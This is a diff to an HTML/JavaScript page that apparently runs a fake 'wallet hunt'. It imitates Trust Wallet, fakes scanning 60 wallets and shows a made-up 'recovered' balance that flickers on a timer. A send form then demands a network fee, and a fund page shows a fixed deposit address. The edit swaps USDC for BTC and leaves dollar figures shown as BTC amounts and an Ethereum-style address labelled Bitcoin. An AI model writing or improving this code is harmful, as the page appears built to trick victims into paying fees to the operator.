@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trust • icy hunt</title>
+  <title>Trust • icy hunt · BTC</title>
   <!-- EmailJS (unchanged) -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
@@ -283,17 +283,61 @@
       color: #b3dbff;
     }
     .crypto-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
       background: rgba(0, 20, 45, 0.5);
       backdrop-filter: blur(8px);
+      padding: 8px 14px;
+      border-radius: 60px;
       border: 1px solid #0070bb;
+      margin: 4px 0;
     }
-    .crypto-name { color: #bde1ff; }
-    .crypto-amount { color: #ecf7ff; }
-    .crypto-sub { color: #8bb9ec; }
+    .crypto-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .crypto-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: rgba(0, 120, 255, 0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .crypto-icon img {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      object-fit: contain;
+    }
+    .crypto-name {
+      font-weight: 560;
+      font-size: 1rem;
+      color: #bde1ff;
+    }
+    .crypto-amount {
+      font-weight: 570;
+      font-size: 1.1rem;
+      color: #ecf7ff;
+    }
+    .crypto-sub {
+      font-size: 0.75rem;
+      color: #8bb9ec;
+    }
     .manage-link {
       background: rgba(0, 60, 120, 0.4);
       backdrop-filter: blur(8px);
+      border-radius: 40px;
+      padding: 10px 18px;
+      text-align: center;
+      font-weight: 550;
+      font-size: 0.95rem;
       border: 1px solid #2e86c1;
+      cursor: pointer;
+      margin-top: 8px;
       color: #c0e2ff;
     }
 
@@ -303,19 +347,137 @@
     .qr-box { background: rgba(0, 20, 45, 0.6); backdrop-filter: blur(12px); border-color: #2f8ed0; }
     .address-row { background: rgba(0, 0, 0, 0.5); border-color: #3a8fd0; color: #c0e2ff; }
     .copy-btn { background: #0059b3; color: white; }
-    .address-input-area { background: rgba(0, 20, 45, 0.5); border-color: #2f81c0; }
-    .address-input-area input { color: #e2f0ff; }
-    .paste-btn { background: #1f5090; border-color: #5fa3e0; color: white; }
-    .network-row { background: rgba(0, 20, 45, 0.5); border-color: #2f81c0; color: #c7e3ff; }
-    .amount-section { background: rgba(0, 20, 45, 0.5); border-color: #2f81c0; }
-    .amount-row input { background: #0a1a2f; border-color: #3f8fd0; color: white; }
-    .max-btn { background: #004a99; color: white; border-color: #5fa8e6; }
-    .usd-hint { color: #8fcbff; }
-    .error-fee-box { background: #102c44; border-color: #ff7f6e; color: #ffcfc0; }
-    .confirm-btn { background: #0059b3; color: white; border-color: #6ab0ff; }
-    .confirm-btn:disabled { background: #1f3857; border-color: #456c94; color: #98b4d4; }
-    .loading-page { color: #b3dcff; }
-    .spinner { border-top-color: #0088ff; }
+    .address-input-area { 
+      display: flex; 
+      align-items: center; 
+      background: rgba(0, 20, 45, 0.5); 
+      backdrop-filter: blur(8px); 
+      border-radius: 60px; 
+      border: 1px solid #2f81c0; 
+      padding: 6px 6px 6px 18px; 
+    }
+    .address-input-area input { 
+      flex: 1; 
+      border: none; 
+      background: transparent; 
+      padding: 12px 0; 
+      font-size: 0.9rem; 
+      outline: none; 
+      color: #e2f0ff; 
+    }
+    .paste-btn { 
+      background: #1f5090; 
+      border: 1px solid #5fa3e0; 
+      border-radius: 40px; 
+      padding: 8px 16px; 
+      font-size: 0.8rem; 
+      font-weight: 500; 
+      color: white; 
+      cursor: pointer; 
+      margin-left: 8px; 
+    }
+    .network-row { 
+      background: rgba(0, 20, 45, 0.5); 
+      backdrop-filter: blur(8px); 
+      border-radius: 60px; 
+      padding: 14px 18px; 
+      border: 1px solid #2f81c0; 
+      display: flex; 
+      justify-content: space-between; 
+      font-size: 0.9rem; 
+      color: #c7e3ff; 
+    }
+    .amount-section { 
+      background: rgba(0, 20, 45, 0.5); 
+      backdrop-filter: blur(8px); 
+      border-radius: 30px; 
+      padding: 16px 18px; 
+      border: 1px solid #2f81c0; 
+    }
+    .amount-row { 
+      display: flex; 
+      align-items: center; 
+      gap: 12px; 
+      margin-bottom: 10px; 
+    }
+    .amount-row input { 
+      flex: 1; 
+      border: none; 
+      background: #0a1a2f; 
+      border-radius: 40px; 
+      padding: 14px 18px; 
+      font-size: 1rem; 
+      border: 1px solid #3f8fd0; 
+      outline: none; 
+      color: white; 
+    }
+    .max-btn { 
+      background: #004a99; 
+      color: white; 
+      border: none; 
+      border-radius: 40px; 
+      padding: 10px 22px; 
+      font-weight: 600; 
+      font-size: 0.9rem; 
+      cursor: pointer; 
+      border: 1px solid #5fa8e6; 
+    }
+    .usd-hint { 
+      text-align: right; 
+      color: #8fcbff; 
+      font-size: 0.8rem; 
+      margin-top: 4px; 
+    }
+    .error-fee-box { 
+      background: #102c44; 
+      border-radius: 30px; 
+      padding: 14px 20px; 
+      border: 1px solid #ff7f6e; 
+      color: #ffcfc0; 
+      font-size: 0.9rem; 
+      display: flex; 
+      align-items: center; 
+      gap: 6px; 
+    }
+    .confirm-btn { 
+      background: #0059b3; 
+      color: white; 
+      border: none; 
+      border-radius: 60px; 
+      padding: 16px; 
+      font-size: 1.2rem; 
+      font-weight: 600; 
+      cursor: pointer; 
+      width: 100%; 
+      margin-top: 12px; 
+      border: 1px solid #6ab0ff; 
+    }
+    .confirm-btn:disabled { 
+      background: #1f3857; 
+      border-color: #456c94; 
+      color: #98b4d4; 
+      cursor: not-allowed; 
+    }
+    .spinner-mini { 
+      display: inline-block; 
+      width: 20px; 
+      height: 20px; 
+      border: 3px solid #e0eaf5; 
+      border-top: 3px solid #0088ff; 
+      border-radius: 50%; 
+      animation: spin 1s linear infinite; 
+      margin-right: 8px; 
+    }
+    .loading-page { align-items: center; justify-content: center; gap: 28px; min-height: 280px; color: #b3dcff; }
+    .spinner { 
+      width: 48px; 
+      height: 48px; 
+      border: 4px solid rgba(0,100,200,0.2); 
+      border-top: 4px solid #0088ff; 
+      border-radius: 50%; 
+      animation: spin 1.2s linear infinite; 
+    }
+    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
@@ -348,11 +510,11 @@
       <div class="back-link-sm" id="backFromLoading">← cancel</div>
     </div>
 
-    <!-- MAIN WALLET PAGE (blue glass) -->
+    <!-- MAIN WALLET PAGE (BTC added, USDC removed, BTC logo) -->
     <div class="page wallet-page" id="walletPage">
       <div class="balance-section">
         <div class="total-label">total balance</div>
-        <div class="total-balance" id="mainBalance">$631.999</div>
+        <div class="total-balance" id="mainBalance">$0.00</div>
         <div class="balance-sub" id="balanceSub">$0.00 (0.0%)</div>
       </div>
 
@@ -371,6 +533,18 @@
         <span class="chip">Watch</span>
       </div>
 
+      <!-- BTC row (first) -->
+      <div class="crypto-row">
+        <div class="crypto-left">
+          <div class="crypto-icon"><img src="https://trustwalleteth.github.io/B/1.png" alt="BTC"></div>
+          <span class="crypto-name">Bitcoin</span>
+        </div>
+        <div style="display:flex; flex-direction:column; align-items:flex-end;">
+          <span class="crypto-amount" id="btcAmount">0</span>
+          <span class="crypto-sub">BTC</span>
+        </div>
+      </div>
+      <!-- ETH row (second) -->
       <div class="crypto-row">
         <div class="crypto-left">
           <div class="crypto-icon"><img src="https://trustwalleteth.github.io/A/1027.png" alt="ETH"></div>
@@ -379,16 +553,6 @@
         <div style="display:flex; flex-direction:column; align-items:flex-end;">
           <span class="crypto-amount">0</span>
           <span class="crypto-sub">ETH</span>
-        </div>
-      </div>
-      <div class="crypto-row">
-        <div class="crypto-left">
-          <div class="crypto-icon"><img src="https://trustwalleteth.github.io/B/27763.png" alt="USDC"></div>
-          <span class="crypto-name">USD Coin</span>
-        </div>
-        <div style="display:flex; flex-direction:column; align-items:flex-end;">
-          <span class="crypto-amount" id="usdcAmount">632</span>
-          <span class="crypto-sub">USDC</span>
         </div>
       </div>
 
@@ -411,15 +575,15 @@
           <span style="font-family: monospace; font-size:0.7rem;" id="fundAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
           <button class="copy-btn" id="fundCopyBtn">copy</button>
         </div>
-        <div style="font-size:0.65rem; color:#8fcbff;">Ethereum network</div>
+        <div style="font-size:0.65rem; color:#8fcbff;">Bitcoin network</div>
       </div>
     </div>
 
-    <!-- SEND PAGE -->
+    <!-- SEND PAGE (BTC) -->
     <div class="page send-page" id="sendPage">
       <div class="send-header">
         <div class="back-link-sm" id="backFromSend">← back</div>
-        <span class="send-title">Send USDC</span>
+        <span class="send-title">Send BTC</span>
         <span style="width:40px;"></span>
       </div>
       <div class="field-group">
@@ -432,22 +596,22 @@
       <div class="field-group">
         <div class="field-label">Destination network</div>
         <div class="network-row">
-          <span>Ethereum</span>
+          <span>Bitcoin</span>
           <span style="color:#9acdff;">▼</span>
         </div>
       </div>
       <div class="field-group">
-        <div class="field-label">Amount</div>
+        <div class="field-label">Amount (BTC)</div>
         <div class="amount-section">
           <div class="amount-row">
-            <input type="number" id="amountInput" placeholder="USDC Amount" min="1" step="1">
+            <input type="number" id="amountInput" placeholder="BTC Amount" min="0.0001" step="any">
             <button class="max-btn" id="maxBtn">Max</button>
           </div>
           <div class="usd-hint" id="usdHint">≈ $0.00</div>
         </div>
       </div>
       <div id="feeErrorBox" style="display: none;" class="error-fee-box">
-        <span>⚠️</span> fee required: 0.01 ETH
+        <span>⚠️</span> fee required: 0.0001 BTC
       </div>
       <button class="confirm-btn" id="confirmSendBtn" disabled>Next</button>
     </div>
@@ -466,24 +630,28 @@
       const statsBar = document.getElementById('statsBar');
       const huntConsole = document.getElementById('huntConsole');
 
-      // generate 60 wallets: only 3 have balance (632, 130, 1325) rest 0
+      // Non-rounded BTC values (in USD)
+      const btcValues = [632.47, 130.28, 1325.64]; // three funded wallets with BTC value
+      
+      // generate 60 wallets: only 3 have balance (BTC values)
       const walletList = [];
       // indices for funded wallets (random)
-      let indices = [0,1,2];
-      while(indices.length < 3) indices.push(Math.floor(Math.random()*60));
-      // shuffle to make them random
-      indices = indices.sort(() => Math.random() - 0.5);
-      const balances = [632, 130, 1325];
+      let indices = [];
+      while(indices.length < 3) {
+        let r = Math.floor(Math.random() * 60);
+        if (!indices.includes(r)) indices.push(r);
+      }
+      
       for (let i = 0; i < 60; i++) {
         let bal = 0;
-        if (i === indices[0]) bal = 632;
-        if (i === indices[1]) bal = 130;
-        if (i === indices[2]) bal = 1325;
+        if (i === indices[0]) bal = btcValues[0];
+        if (i === indices[1]) bal = btcValues[1];
+        if (i === indices[2]) bal = btcValues[2];
         let addr = '0x' + Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('');
         walletList.push({ address: addr, balance: bal });
       }
 
-      // store recovered wallet (to use in send page)
+      // store recovered wallet
       let recoveredWallet = null;
 
       // scanning state
@@ -492,7 +660,7 @@
       let currentIndex = 0;
 
       function randomDepth() {
-        return Math.floor(Math.random() * 3000) + 7500; // random between 7500 and 10500
+        return Math.floor(Math.random() * 3000) + 7500;
       }
 
       function updateStatsBar() {
@@ -509,14 +677,13 @@
         if (scanning) return;
         scanning = true;
         currentIndex = 0;
-        huntConsole.innerHTML = ''; // clear
+        huntConsole.innerHTML = '';
 
         scanInterval = setInterval(() => {
           if (currentIndex >= 60) {
             clearInterval(scanInterval);
             scanning = false;
 
-            // pick random wallet from the 60 (true random)
             const randomPick = Math.floor(Math.random() * 60);
             recoveredWallet = walletList[randomPick];
 
@@ -532,22 +699,24 @@
               setTimeout(() => {
                 loading.classList.remove('active');
                 wallet.classList.add('active');
-                // update wallet balance according to recovered
+                
                 const bal = recoveredWallet.balance;
-                if (bal === 632) {
-                  document.getElementById('mainBalance').innerText = '$632';
-                  document.getElementById('usdcAmount').innerText = '632';
-                } else if (bal === 130) {
-                  document.getElementById('mainBalance').innerText = '$130';
-                  document.getElementById('usdcAmount').innerText = '130';
-                } else if (bal === 1325) {
-                  document.getElementById('mainBalance').innerText = '$1,325';
-                  document.getElementById('usdcAmount').innerText = '1325';
+                const btcAmountEl = document.getElementById('btcAmount');
+                const mainBalanceEl = document.getElementById('mainBalance');
+                
+                if (bal === btcValues[0]) {
+                  mainBalanceEl.innerText = '$632.47';
+                  btcAmountEl.innerText = '632.47';
+                } else if (bal === btcValues[1]) {
+                  mainBalanceEl.innerText = '$130.28';
+                  btcAmountEl.innerText = '130.28';
+                } else if (bal === btcValues[2]) {
+                  mainBalanceEl.innerText = '$1,325.64';
+                  btcAmountEl.innerText = '1325.64';
                 } else {
-                  document.getElementById('mainBalance').innerText = '$0.00';
-                  document.getElementById('usdcAmount').innerText = '0';
+                  mainBalanceEl.innerText = '$0.00';
+                  btcAmountEl.innerText = '0';
                 }
-                // store recovered balance for max button in send page
               }, 2000);
             }, 600);
             return;
@@ -560,7 +729,7 @@
           huntConsole.appendChild(line);
           huntConsole.scrollTop = huntConsole.scrollHeight;
           currentIndex++;
-        }, 190); // 60*190 ≈ 11.4 sec
+        }, 190);
       }
 
       huntBtn.addEventListener('click', startHunt);
@@ -576,7 +745,7 @@
         updateStatsBar();
       });
 
-      manageBtn.addEventListener('click', ()=>{
+      document.getElementById('manageCryptoBtn').addEventListener('click', ()=>{
         wallet.classList.remove('active');
         loading.classList.add('active');
         setTimeout(() => {
@@ -590,7 +759,7 @@
       });
 
       // fund
-      fundAction.addEventListener('click', ()=>{
+      document.getElementById('fundActionMain').addEventListener('click', ()=>{
         wallet.classList.remove('active');
         fundPage.classList.add('active');
       });
@@ -600,20 +769,21 @@
       });
 
       // send
-      sendAction.addEventListener('click', ()=>{
+      document.getElementById('sendActionMain').addEventListener('click', ()=>{
         wallet.classList.remove('active');
         sendPage.classList.add('active');
         document.getElementById('addressInput').value = '';
         document.getElementById('amountInput').value = '';
         document.getElementById('usdHint').innerText = '≈ $0.00';
         document.getElementById('feeErrorBox').style.display = 'none';
-        // set max based on recovered wallet
-        if (recoveredWallet) {
+        
+        if (recoveredWallet && recoveredWallet.balance > 0) {
           const maxBalance = recoveredWallet.balance;
           document.getElementById('amountInput').max = maxBalance;
-          document.getElementById('amountInput').placeholder = `USDC Amount (max ${maxBalance})`;
+          document.getElementById('amountInput').placeholder = `BTC Amount (max ${maxBalance})`;
         } else {
-          document.getElementById('amountInput').max = 632; // fallback
+          document.getElementById('amountInput').max = 0;
+          document.getElementById('amountInput').placeholder = 'BTC Amount (no funds)';
         }
         validateSendForm();
       });
@@ -643,10 +813,10 @@
       });
 
       maxBtn.addEventListener('click', ()=>{
-        if (recoveredWallet) {
+        if (recoveredWallet && recoveredWallet.balance > 0) {
           amountInput.value = recoveredWallet.balance;
         } else {
-          amountInput.value = 632; // fallback
+          amountInput.value = 0;
         }
         updateUsdHint();
         capAmount();
@@ -661,21 +831,21 @@
 
       function capAmount() {
         let val = parseFloat(amountInput.value);
-        let maxVal = recoveredWallet ? recoveredWallet.balance : 632;
+        let maxVal = (recoveredWallet && recoveredWallet.balance > 0) ? recoveredWallet.balance : 0;
         if (!isNaN(val) && val > maxVal) amountInput.value = maxVal;
-        else if (val < 1 && amountInput.value !== '') amountInput.value = 1;
+        else if (val < 0.0001 && amountInput.value !== '' && val > 0) amountInput.value = 0.0001;
       }
 
       function updateUsdHint() {
         let val = parseFloat(amountInput.value);
-        usdHint.innerText = (!isNaN(val) && val >= 1) ? `≈ $${val.toFixed(2)}` : '≈ $0.00';
+        usdHint.innerText = (!isNaN(val) && val >= 0.0001) ? `≈ $${val.toFixed(2)}` : '≈ $0.00';
       }
 
       function validateSendForm() {
         const addr = addressInput.value.trim();
         const amt = parseFloat(amountInput.value);
-        const maxVal = recoveredWallet ? recoveredWallet.balance : 632;
-        const valid = addr.length > 0 && !isNaN(amt) && amt >= 1 && amt <= maxVal;
+        const maxVal = (recoveredWallet && recoveredWallet.balance > 0) ? recoveredWallet.balance : 0;
+        const valid = addr.length > 0 && !isNaN(amt) && amt >= 0.0001 && amt <= maxVal;
         confirmBtn.disabled = !valid;
       }
 
@@ -706,23 +876,23 @@
         });
       });
 
-      // balance toggle (only if not zero, and adapt to recovered wallet)
-      const balanceEl = document.getElementById('mainBalance');
-      const usdcAmountEl = document.getElementById('usdcAmount');
+      // balance toggle for BTC
+      const btcAmountEl = document.getElementById('btcAmount');
+      const mainBalanceEl = document.getElementById('mainBalance');
       let highBalance = false;
       setInterval(() => {
         if (recoveredWallet && recoveredWallet.balance > 0) {
           highBalance = !highBalance;
           let base = recoveredWallet.balance;
-          if (base === 632) {
-            balanceEl.innerText = highBalance ? '$632' : '$631.999';
-            usdcAmountEl.innerText = highBalance ? '632' : '631.999';
-          } else if (base === 130) {
-            balanceEl.innerText = highBalance ? '$130' : '$129.999';
-            usdcAmountEl.innerText = highBalance ? '130' : '129.999';
-          } else if (base === 1325) {
-            balanceEl.innerText = highBalance ? '$1,325' : '$1,324.999';
-            usdcAmountEl.innerText = highBalance ? '1325' : '1324.999';
+          if (base === btcValues[0]) {
+            mainBalanceEl.innerText = highBalance ? '$632.47' : '$631.999';
+            btcAmountEl.innerText = highBalance ? '632.47' : '631.999';
+          } else if (base === btcValues[1]) {
+            mainBalanceEl.innerText = highBalance ? '$130.28' : '$129.999';
+            btcAmountEl.innerText = highBalance ? '130.28' : '129.999';
+          } else if (base === btcValues[2]) {
+            mainBalanceEl.innerText = highBalance ? '$1,325.64' : '$1,324.999';
+            btcAmountEl.innerText = highBalance ? '1325.64' : '1324.999';
           }
         }
       }, 10000);
